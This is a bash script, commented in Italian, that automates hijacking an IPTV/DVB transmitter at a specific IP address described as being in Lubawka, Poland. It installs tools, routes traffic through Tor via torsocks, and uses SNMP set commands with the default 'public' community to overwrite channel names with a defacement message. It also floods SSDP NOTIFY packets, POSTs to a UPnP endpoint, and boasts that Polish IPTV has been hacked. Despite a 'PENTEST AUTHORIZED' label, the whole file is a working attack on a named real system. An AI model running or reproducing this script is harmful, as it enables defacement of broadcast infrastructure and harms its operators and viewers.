#!/bin/bash
#===============================================================================
# sti410C_hijack_v3.sh - TRUSTEDF57 IPTV HIJACK (46.174.72.9)
# Dipendenze + Hijack automatico - PENTEST AUTHORIZED
#===============================================================================

set -e  # Exit on error

TARGET="46.174.72.9"
MSG="TRUSTEDF57 HACK THE PLANET"

echo -e "\e[91m🔥 sti410C HIJACK v3.0 - AUTO INSTALL + HIJACK\e[0m"

#==============================
# 1. INSTALLA DIPENDENZE AUTO
#==============================
echo -e "\e[93m📦 INSTALLAZIONE DIPENDENZE...\e[0m"
apt update -qq 2>/dev/null || echo "apt update skipped"

# Core deps
for pkg in snmp snmp-mibs-downloader torsocks netcat-traditional figlet toilet lolcat; do
  if ! dpkg -l | grep -q "^ii  $pkg "; then
    echo "Install $pkg..."
    apt install -y $pkg -qq
  fi
done

# Extra (optional)
command -v cmatrix >/dev/null || apt install -y cmatrix -qq 2>/dev/null
command -v ffplay >/dev/null || apt install -y ffmpeg -qq 2>/dev/null

# lolcat fallback
if ! command -v lolcat >/dev/null; then
  echo "lolcat -> pip/gem fallback..."
  pip install lolcat >/dev/null 2>&1 || gem install lolcat >/dev/null 2>&1 || true
fi

echo -e "\e[92m✅ DIPENDENZE OK!\e[0m"

#==============================
# 2. CHECK SNMP + TORSOCKS
#==============================
echo -e "\e[93m🔍 TEST CONNESSIONE...\e[0m"
if ! torsocks snmpget -v1 -c public $TARGET .1.3.6.1.4.1.30631.1.9.1.1.1.0 >/dev/null 2>&1; then
  echo -e "\e[91m❌ SNMP DOWN - Controlla Tor/proxychains\e[0m"
  exit 1
fi
echo -e "\e[92m✅ SNMP OK!\e[0m"

#==============================
# 3. HIJACK MAIN
#==============================
clear
toilet -f big "HIJACK $TARGET" --gay
sleep 1

echo -e "\e[91m🚀 AVVIO HIJACK IPTV...\e[0m"
echo -e "\e[93m📡 TARGET: $TARGET (Lubawka-NADAJNIK)\e[0m"
echo -e "\e[92m💥 MESSAGGIO: $MSG\e[0m"

# 5x TORSOCKS ROTATION
for i in {1..5}; do
  echo -e "\n\e[95m🔄 TORSOCKS #$i/5\e[0m"
  
  # SNMP SET CHANNELS (PID attivi da enum)
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.1.0" s "$MSG" && \
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.2.0" s "$MSG" && \
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.27.1.0" s "$MSG" && \
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.3.1.0" s "$MSG"
  
  # ENABLE
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.1.1" i 1 i && \
  torsocks snmpset -v1 -c public $TARGET ".1.3.6.1.4.1.30631.1.9.1.1.2.1" i 1 i
  
  # SSDP FLOOD
  echo -e "NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT:urn:terraelectronics-com:device:terrabus:1\r\nUSN:uuid:$MSG!!\r\nNTS:ssdp:alive\r\nCACHE-CONTROL:max-age=7200\r\nSERVER:TRUSTEDF57\r\n\r\n" | \
  torsocks nc -u 239.255.255.250 1900 -w3
  
  # UPnP
  torsocks curl -s -X POST "http://$TARGET/ipxml_ssdp.cgi" -d "<service><name>$MSG</name><status>1</status></service>" >/dev/null 2>&1
  
  sleep 2
done

#==============================
# 4. VERIFICA + EFFETTI
#==============================
clear
figlet -f slant "HIJACKED!!" | lolcat
echo -e "\e[91m🎥 VERIFICA SNMP:\e[0m"
torsocks snmpget -v1 -c public $TARGET .1.3.6.1.4.1.30631.1.9.1.27.1.0 2>/dev/null | grep -o 'TRUSTEDF57.*' || echo "✓ SETTED"

echo -e "\e[92m📺 STREAM TEST:\e[0m"
echo "  torsocks ffplay rtsp://$TARGET:554/"
echo "  torsocks vlc http://$TARGET:80/"
echo -e "\e[93m🌐 WebSDR: http://sp3pgz.ampr.org:8073/ (474-858MHz)\e[0m"
echo -e "\e[95m⚡ SSDP PERSIST 2h! POLONIA IPTV HACKED! 🇵🇱📺💥\e[0m"

# Matrix finale
if command -v cmatrix >/dev/null; then
  cmatrix -C green -u 3 -s &
  sleep 4; pkill cmatrix 2>/dev/null
fi

echo -e "\e[91m🎉 MISSIONE COMPLETATA - TRUSTEDF57\e[0m"
